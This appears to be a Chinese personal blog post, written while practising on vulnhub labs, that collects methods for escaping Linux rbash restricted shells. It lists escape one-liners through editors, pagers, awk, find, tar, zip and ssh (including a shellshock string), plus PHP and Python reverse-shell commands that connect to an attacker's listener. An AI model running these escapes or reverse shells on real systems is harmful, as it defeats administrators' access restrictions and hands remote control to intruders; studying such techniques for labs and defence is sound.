class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-08-05T10:34:05.816Z" title="更新于 2024-08-05 18:34:05">2024-08-05</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">3k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>11分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="Linux提权学习之rbash逃逸"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2024/07/20/linux-ti-quan-xue-xi-yi/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2024/07/20/linux-ti-quan-xue-xi-yi/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2024/07/20/linux-ti-quan-xue-xi-yi/"><header><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url">内网渗透</a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" tabindex="-1" itemprop="url">Linux提权</a><h1 id="CrawlerTitle" itemprop="name headline">Linux提权学习之rbash逃逸</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2024-07-20T07:24:56.000Z" title="发表于 2024-07-20 15:24:56">2024-07-20</time><time itemprop="dateCreated datePublished" datetime="2024-08-05T10:34:05.816Z" title="更新于 2024-08-05 18:34:05">2024-08-05</time></header><h1 id="0x01-前言">0x01 前言</h1>
<p>本文的产生也是在刷vulnhub靶场的时候遇到的，由于自身太菜，因此可以看到本文的知识都是cv的┭┮﹏┭┮，自己的想法很少的，也就实操那一部分会跟着做做，还请见谅~~</p>
<h1 id="0x02-rbash简述">0x02 rbash简述</h1>
<h2 id="1-什么是rbash">1、什么是rbash</h2>
<p>它与一般shell的区别在于会限制一些行为，让一些命令无法执行</p>
<h2 id="2-如何设置一个rbash">2、如何设置一个rbash</h2>
<pre><code class="hljs bash"><span class="hljs-built_in">cp</span> /bin/bash /bin/rbash <span class="hljs-comment"># 复制一个bash，重命名为rbash</span>
useradd -s /bin/rbash <span class="hljs-built_in">test</span> <span class="hljs-comment"># 设置用户test登陆的shell为rbash</span>
<span class="hljs-built_in">mkdir</span> -p /home/test/.bin <span class="hljs-comment"># 在test用户下新建一个.bin目录存放可以执行的命令</span></code></pre>
<h2 id="3-使用场景">3、使用场景</h2>
<p>Linux Restricted Shell是一种限制命令(如：cd、ls、echo等)、阻止环境变量（如：shell、path、user），甚至于阻止管道/重定向（如：&gt;，&gt;&gt;，|）的shell。</p>
<p><strong>常见的Linux Restricted Shell有rbash、rksh、rsh。</strong></p>
<p>Linux Restricted Shell有如下场景使用</p>
<pre><code class="hljs plaintext">1. 提高系统安全性
2. 阻止黑客执行高危命令
3. 系统管理员创建受限制Shell，进而防止普通用户执行危险命令
4. 部分CTF赛题，如Root-Me、HackThebox、vulnhub</code></pre>
<h1 id="0x03-信息搜集">0x03 信息搜集</h1>
<p>这里我们主要是通过信息搜集来确定当下的rbash环境下可以执行那些命令，以及环境信息。</p>
<pre><code class="hljs bash">1. 检查可用的命令，如：<span class="hljs-built_in">cd</span>、<span class="hljs-built_in">ls</span>、<span class="hljs-built_in">echo</span>等
2. 检查运算符，如：&gt;、&gt;&gt;、|、&lt;等
3. 检查可用的编程语言，如：php、perl、ruby、python等
4. 哪些命令可以作为root (sudo -l)运行
5. 检查具有SUID perm权限的文件或命令
6. 检查当前使用的shell：<span class="hljs-built_in">echo</span> <span class="hljs-variable">$shell</span>
7. 检查环境变量：运行<span class="hljs-built_in">env</span>、<span class="hljs-built_in">printenv</span>、<span class="hljs-built_in">set</span>等</code></pre>
<p>通过以上操作,我们已收集到一些有用的信息，接下来尝试一下通用的利用方法。</p>
<h1 id="0x04-常用逃逸命令">0x04 常用逃逸命令</h1>
<pre><code class="hljs bash">1. 如果允许使用“/”，则可以运行/bin/sh、/bin/bash
2. 如果允许使用<span class="hljs-built_in">cp</span>命令，则可以复制/bin/sh或者/bin/bash到当前目录
3. 使用ftp进行命令执行，执行 !/bin/sh
4. 使用gdb进行命令执行，执行 !/bin/sh
5. 使用more/man/less进行命令执行，执行 !/bin/sh
6. 使用vim进行命令执行，执行 !/bin/sh
7. 使用rvim执行:python，然后运行import os; os.system(<span class="hljs-string">"/bin/bash )</span>
<span class="hljs-string">8. 使用scp，通过scp来传入自己脚本</span>
<span class="hljs-string">9. 使用awk，执行awk 'BEGIN {system("</span>/bin/sh or /bin/bash<span class="hljs-string">")}'</span>
<span class="hljs-string">10. 使用find，执行find / -name test -exec /bin/sh or /bin/bash \</span></code></pre>
<h2 id="41-如果允许使用">4.1 如果允许使用“/”</h2>
<p>则可以运行/bin/sh、/bin/bash</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230927195558597.png" alt="image-20230927195558597"></p>
<h2 id="42-如果允许使用cp命令">4.2 如果允许使用cp命令</h2>
<p>则可以复制/bin/sh到当前目录，不过这里我没有复现成功cp /bin/bash，应该是环境条件不允许吧。—下面有补充</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230927200405517.png" alt="image-20230927200405517"></p>
<h2 id="43-使用ftp进行命令执行">4.3 使用ftp进行命令执行</h2>
<p>执行 !/bin/sh</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230927195253320.png" alt="image-20230927195253320"></p>
<p>如上图所示的ftp命令</p>
<h2 id="44-使用gdb进行命令执行">4.4 使用gdb进行命令执行</h2>
<p>执行 !/bin/sh</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230927200626894.png" alt="image-20230927200626894"></p>
<p>不过前提就是该环境下有gdb环境</p>
<h2 id="45-使用moremanless进行命令执行">4.5 使用more/man/less进行命令执行</h2>
<p>执行 !/bin/sh</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230927201047565.png" alt="image-20230927201047565"></p>
<p>这里那些文章介绍的不清楚，我复现了一下发现还是需要某种条件：也就是你当前目录下有足够大的内容的文本，这样more读取的时候才会体现出<strong>分页读取</strong>的效果，进而你可以直接输入!/bin/sh</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230927201358664.png" alt="image-20230927201358664"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230927201600091.png" alt="image-20230927201600091"></p>
<p>如图less不必非得读取内容多的文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230927201659205.png" alt="image-20230927201659205"></p>
<p>man似乎直接输入man man即可</p>
<h2 id="46-使用vim进行命令执行">4.6 使用vim进行命令执行</h2>
<p>执行 !/bin/sh</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230927201810774.png" alt="image-20230927201810774"></p>
<h2 id="47-使用rvim执行python">4.7 使用rvim执行python</h2>
<p><code>python import os; os.system("/bin/bash")</code></p>
<p>这里不知为何提示我在rvim中无法执行shell命令/禁止使用命令。</p>
<p>但也可能是我不会操作吧。。。。</p>
<h2 id="48-使用scp传入自己的脚本">4.8 使用scp传入自己的脚本</h2>
<p>这里未复现</p>
<pre><code class="hljs plaintext">scp -S /path/yourscript x y:</code></pre>
<p><strong>目标机器连接 kali 利用 ssh 将 exp 下载到靶机上来</strong></p>
<blockquote>
<p>scp &gt;<a href="mailto:root@192.168.26.20">root@192.168.26.20</a>:/usr/share/exploitdb/exploits/linux/local/46996.sh /tmp/     #靶机上执行  用户名和 IP 是 kali 的</p>
<p>scp /path/local_filename username@IP:/path   #kali 上执行  用户名和 IP 是靶机的</p>
</blockquote>
<p>涉及到的提权方式：</p>
<p>**Tips：**拿到一个本地普通用户后，往往先要在该用户的家目录下搜索一番，以寻找有用的信息，提权的时候几乎所有的文件操作都在 tmp 目录下，因为其他目录往往没有权限，所以要时刻注意自己当前所在的目录。</p>
<blockquote>
<p>find / -user root -perm -4000 -print 2&gt;/dev/null   #发现具有 suid 权限的命令</p>
</blockquote>
<h2 id="49-使用awk命令执行">4.9 使用awk命令执行</h2>
<p>执行<code>awk 'BEGIN {system("/bin/sh or /bin/bash")}'</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230927202910634.png" alt="image-20230927202910634"></p>
<p>不过这里更推荐使用一种，我这个环境不知为何使用不了bash，估计是我之前修改了吧</p>
<pre><code class="hljs plaintext">awk 'BEGIN {system("/bin/sh")}'</code></pre>
<h2 id="410-使用find执行命令">4.10 使用find执行命令</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230927203059460.png" alt="image-20230927203059460"></p>
<p>这里也是使用其中一个</p>
<p>这里看了几篇文章，我再补充一下上述的cp命令：</p>
<h2 id="411-补充">4.11 补充</h2>
<h3 id="1-cp-binbash到本地用户目录">1、cp /bin/bash到本地用户目录</h3>
<pre><code class="hljs bash"><span class="hljs-built_in">cp</span> /bin/bash test1
<span class="hljs-built_in">cp</span> /bin/sh test2
./test1 <span class="hljs-comment"># 切换到了/bin/bash</span>
./test2 <span class="hljs-comment"># 切换到了/bin/sh</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230927203517878.png" alt="image-20230927203517878"></p>
<p>执行：<code>git &gt; git help status</code> --这里说git也可，但我没有找到方法</p>
<h3 id="2-set-shell">2、set shell</h3>
<p><strong>DC-2靶机使用它成功了</strong></p>
<ul>
<li>在一些编辑器中可以设置shell变量然后执行，如vim中</li>
</ul>
<pre><code class="hljs bash"><span class="hljs-comment"># vim/vi进入之后</span>
:<span class="hljs-built_in">set</span> shell=/bin/sh <span class="hljs-comment"># 或者用/bin/bash</span>
:shell

<span class="hljs-comment"># 切换完成之后还要添加环境变量。给$PATH变量增加两个路径，用来查找命令</span>
<span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/bin/
<span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/usr/bin/</code></pre>
<h3 id="3-更改path或shell环境变量">3、更改PATH或SHELL环境变量</h3>
<pre><code class="hljs plaintext">执行：export -p # 查看系统的环境变量设置

PATH 和 SHELL 变量的权限设置很可能是：“-rx” ，这就意味着我们只能执行和读取，不能写入。如果有w权限的话，我们可以直接给它写入/bin/bash</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230927204458332.png" alt="image-20230927204458332"></p>
<h1 id="0x05-编程语言逃逸">0x05 编程语言逃逸</h1>
<h2 id="51-python">5.1 Python</h2>
<pre><code class="hljs python">python -c <span class="hljs-string">"import os;os.system('/bin/bash')"</span>
或者
python -c <span class="hljs-string">"import pty;pty.spawn('/bin/bash')"</span></code></pre>
<h2 id="52-php">5.2 PHP</h2>
<pre><code class="hljs php">php -a then <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">"sh -i"</span>)</code></pre>
<h2 id="53-perl">5.3 perl</h2>
<pre><code class="hljs perl">perl -e <span class="hljs-string">"exec '/bin/sh';"</span></code></pre>
<h2 id="54-lua">5.4 lua</h2>
<pre><code class="hljs lua"><span class="hljs-built_in">os</span>.<span class="hljs-built_in">execute</span>(<span class="hljs-string">'/bin/sh'</span>)</code></pre>
<h2 id="55-ruby">5.5 Ruby</h2>
<pre><code class="hljs ruby">exec <span class="hljs-string">"/bin/sh"</span></code></pre>
<h2 id="56-except">5.6 except</h2>
<pre><code class="hljs plaintext">except spawn sh then sh.</code></pre>
<p>不过这些编程语言的用法未曾复现，我发现在kali上输入的时候没反应，估计是环境不匹配吧。暂作记录</p>
<h1 id="0x06-高级技术">0x06 高级技术</h1>
<h2 id="61-ssh">6.1 ssh</h2>
<pre><code class="hljs shell">1.ssh username@IP -t "/bin/sh" or "/bin/bash"
2.ssh username@IP -t "bash --noprofile"
3.ssh username@IP -t "() { :; }; /bin/bash" (sehllshock)
4.ssh -o ProxyCommand="sh -c /tmp/yourfile.sh" 127.0.0.1 (SUID)</code></pre>
<h2 id="62-zip">6.2 zip</h2>
<pre><code class="hljs shell">zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"</code></pre>
<h2 id="63-tar">6.3 tar</h2>
<pre><code class="hljs bash">tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=<span class="hljs-built_in">exec</span>=/bin/bash</code></pre>
<h2 id="64-pico">6.4 pico</h2>
<pre><code class="hljs bash">执行pico -s <span class="hljs-string">"/bin/bash"</span>，然后写入/bin/bash，并且执行CTRL+T</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230927212137229.png" alt="image-20230927212137229"></p>
<p>这里复现了一波，步骤为直接输入<code>pico -s "/bin/bash"</code>，然后按ctrl+o会让你编写文件名，文件名随意写，接着按ctrl+t，然后执行你想要的命令如whoami，id等等即可</p>
<h2 id="65-环境变量修复">6.5 环境变量修复</h2>
<p>获取到的Shell，环境变量可能会缺失，在这里可以通过如下命令进行修复</p>
<pre><code class="hljs shell">export PATH=$PATH:/sbin:/usr/sbin:/bin:/usr/bin</code></pre>
<h1 id="0x07-简单实战">0x07 简单实战</h1>
<h2 id="71-创建测试用户">7.1 创建测试用户</h2>
<p>使用具有sudo特权的用户创建一个新测试用户</p>
<pre><code class="hljs bash">useradd -m <span class="hljs-built_in">test</span> -s /bin/rbash <span class="hljs-comment">## 创建一个用户名为test，并且设置test登录shell为rbash</span>
passwd <span class="hljs-built_in">test</span>					<span class="hljs-comment">## 为test设置密码</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230927212751837.png" alt="image-20230927212751837"></p>
<p>这里密码为123456</p>
<h3 id="711-为新用户建立目录">7.1.1 为新用户建立目录</h3>
<pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> /home/test/bin</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230927212847642.png" alt="image-20230927212847642"></p>
<h3 id="712-指定用户可以运行的命令">7.1.2 指定用户可以运行的命令</h3>
<p>为用户指定可以运行的命令，创建指向新建目录链接。指定用户可以运行<code>mkdir``ls``ping</code></p>
<pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /bin/bash /bin/rbash <span class="hljs-comment">## 从Bash 创建一个名为rbash的符号链接</span>
<span class="hljs-built_in">ln</span> -s /bin/mkdir /home/test1/bin 

<span class="hljs-built_in">ln</span> -s /bin/ls /home/test1/bin

<span class="hljs-built_in">ln</span> -s /bin/ping /home/test1/bin</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230927213119353.png" alt="image-20230927213119353"></p>
<h2 id="72-rbash逃逸">7.2 rbash逃逸</h2>
<h3 id="721-切换用户时逃逸">7.2.1 切换用户时逃逸</h3>
<p>这里的原理涉及到su 和 su- 的区别：</p>
<pre><code class="hljs plaintext">su命令，只会更改当前用户，而不会更改当前的用户环境，比如你从oracle 用户su到root账户中，当前路径仍是你刚才的路径，环境变量仍是oracle用户的

su- 命令，则在更改当前用户信息的同时还会更改用户环境，但是假如你从oracle 用户su -到root账户，你会发现你的当前路径已经变为/root/，环境变量也变了</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230927213422218.png" alt="image-20230927213422218"></p>
<p>逃逸：</p>
<pre><code class="hljs bash">su -l test1
su - test1
su --login test1</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230927213823393.png" alt="image-20230927213823393"></p>
<p>这里我并未复现成功，就先看个图吧</p>
<h3 id="722-ssh登录时逃逸">7.2.2 ssh登录时逃逸</h3>
<p>（借助-t远程在远程机器上运行脚本）</p>
<pre><code class="hljs bash">ssh username@IP -t <span class="hljs-string">"/bin/sh"</span> or <span class="hljs-string">"/bin/bash"</span>
ssh username@IP -t <span class="hljs-string">"bash --noprofile"</span>
ssh username@IP -t <span class="hljs-string">"() { :; }; /bin/bash"</span>   <span class="hljs-comment">###shellshock</span></code></pre>
<h3 id="723-当前shell中逃逸">7.2.3 当前shell中逃逸</h3>
<h4 id="7231-特殊情况">7.2.3.1 特殊情况</h4>
<p>[1] / 被允许的情况下；直接 /bin/sh 或 /bin/bash</p>
<p>[2]能够设置PATH或SHELL时</p>
<pre><code class="hljs plaintext">export PATH=$PATH:/bin/:/usr/bin:$PATH
export SHELL=/bin/sh</code></pre>
<p>[3]权限足够时</p>
<pre><code class="hljs plaintext">cp /bin/sh /path/ ;sh
或
cp /bin/bash /path/ ;sh</code></pre>
<h3 id="724-利用系统常见应用逃逸">7.2.4 利用系统常见应用逃逸</h3>
<pre><code class="hljs plaintext">[1]ftp
[2]more
[3]less
[4]man
[5]vi
[6]vim
以上在输入的地方输入!/bin/sh 或 !/bin/bash</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230927214155912.png" alt="image-20230927214155912"></p>
<h3 id="725-利用用户安装应用逃逸">7.2.5 利用用户安装应用逃逸</h3>
<h4 id="1-ed-editor">1、ed-editor</h4>
<pre><code class="hljs plaintext">ed
!'/bin/sh'</code></pre>
<h4 id="2-git">2、git</h4>
<pre><code class="hljs plaintext">git help status 
!/bin/bash</code></pre>
<h4 id="3-zip">3、zip</h4>
<pre><code class="hljs plaintext">zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"</code></pre>
<h4 id="4-tar">4、tar</h4>
<pre><code class="hljs plaintext">tar cf /dev/null filename --checkpoint=1 --checkpoint-action=exec=/bin/bash</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230927214312060.png" alt="image-20230927214312060"></p>
<h3 id="726-利用编程语言环境绕过">7.2.6 利用编程语言环境绕过</h3>
<h4 id="1-python">1、python</h4>
<pre><code class="hljs plaintext">python -c 'import os; os.system("/bin/sh")'</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230927214351901.png" alt="image-20230927214351901"></p>
<p>这里也是解密了，原来是在真实情况下才可以。。。</p>
<h4 id="2-php">2、php</h4>
<pre><code class="hljs plaintext">php -a then exec("sh -i");</code></pre>
<p>这里仍未复现成功，它提示我语法错误？？？不理解</p>
<p>使用PHP反弹设shell绕过</p>
<pre><code class="hljs php">攻击机开启监听``nc -lvp PORT``目标机建立连接``php -r <span class="hljs-string">'$sock=fsockopen("IP",PORT);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></code></pre>
<h4 id="3-perl">3、perl</h4>
<pre><code class="hljs plaintext">perl -e 'exec "/bin/sh";'</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230927214552077.png" alt="image-20230927214552077"></p>
<h4 id="4-lua">4、lua</h4>
<pre><code class="hljs plaintext">os.execute('/bin/sh')</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230927214652108.png" alt="image-20230927214652108"></p>
<p>同PHP。。。估计真是语法问题？</p>
<h4 id="5-ruby">5、ruby</h4>
<pre><code class="hljs plaintext">exec "/bin/sh"</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230927214724097.png" alt="image-20230927214724097"></p>
<h4 id="6-expect">6、expect</h4>
<pre><code class="hljs plaintext">spwan sh
sh</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230927214742434.png" alt="image-20230927214742434"></p>
<h1 id="0x08-tips">0x08 tips:</h1>
<p>8.1 比rbash更容易遇到的问题是当前路径异常问题</p>
<pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span>  <span class="hljs-comment">###一般很多命令基础执行不了的时候，都是路径异常，查看该值可验证    </span>
<span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin   <span class="hljs-comment">####修复</span></code></pre>
<p>8.2 不能使用 &gt; ，&gt;&gt;等字符重定向写文件：echo ‘script code’ | tee scriptfile</p>
<p>8.3 su切换用户逃逸时还可以在切换用户时执行spawn shell命令</p>
<pre><code class="hljs bash">su -c <span class="hljs-string">"python -c  'import pty;pty.spawn(\"/bin/bash\")'"</span> test1</code></pre>
<p>8.4 ssh 登录时同样可以通过spawn shell逃逸</p>
<pre><code class="hljs bash">ssh username@IP  <span class="hljs-string">"export TERM=xterm;python -c  'import pty;pty.spawn(\"/bin/bash\")'</span></code></pre>
<p>8.5 编程语言绕过的利用，还可以使用反弹shell到我们攻击机的方式进行逃逸，以python为例：</p>
<pre><code class="hljs python">python -c <span class="hljs-string">'import       socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LISTENING IP",LISTENING PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></code></pre>
<p>8.6 上边用的比较多的是 !/bin/sh 和 !/bin/bash;其实还有一个 !‘sh’ —&gt;由于没有了 ‘/’ ；有时候能够达到很好的绕过效果</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230927215051670.png" alt="image-20230927215051670"></p>
<p>8.7 同理在路径正确的情况下，在当前rbash中直接输入 sh 也能够完成逃逸( !/bin/sh 和 !/bin/bash 逃逸失败报错同[6] )</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230927215130750.png" alt="image-20230927215130750"></p>
<h1 id="0x09-总结">0x09 总结</h1>
<p>这次也就是简单的演示了一下各种情况，毕竟环境配置也很难很烦，因此就草草了事，只需要记得有这些姿势即可，在实战时遇到问题在对应解决。</p>
<p>上述这些逃逸方式应用到其他类型的restricted shell中也是可以的，由于不同系统特性不同，逃逸的方式也有很大差异；再就是用户限制的宽松程度不同，我们能够逃逸的方式也不同；用户安装的git、tar、zip等应用也能够给予很大的帮助；总之就是要多尝试，灵活应用！！！</p>
<h1 id="0x10-参考文章">0x10 参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_25924971/article/details/128884687">【安全】Linux Restricted Shell 绕过指南</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kuaile1314/p/12246116.html">[渗透技巧——如何逃逸Linux的受限制shell执行任意命令 ]</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43168364/article/details/111830233">【渗透测试】— rbash逃逸方法简述</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7642">rbash逃逸大全</a></p>
<p><a target="_blank" rel="noopener" href="https://posts.careerengine.us/p/623c361911387a6b1ddc861f">Restricted Bash绕过技巧</a>  --建立rbash环境可参考</p>
<p><a target="_blank" rel="noopener" href="https://xie.infoq.cn/article/79f9d1ae819819834577891fd">DC 系列靶机知识点总结</a></p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a 